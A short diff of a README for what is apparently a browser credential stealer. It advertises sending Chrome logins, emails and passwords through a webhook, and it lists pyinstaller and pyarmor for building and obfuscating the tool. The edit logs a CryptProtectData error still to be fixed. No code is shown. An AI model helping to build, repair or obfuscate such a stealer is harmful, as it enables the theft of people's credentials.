@@ -7,7 +7,7 @@
        + **New ability: Sends all the chrome data (login, email, password) through a webhook**
    
      # Whats next:
-       + idk gib ideas in pull request ty
+       + pywintypes.error: (87, 'CryptProtectData', 'The parameter is incorrect.') [Need to fix it]
 
 # How to compile
  - In CMD: `pip install pyinstaller` & `pip install pyarmor`
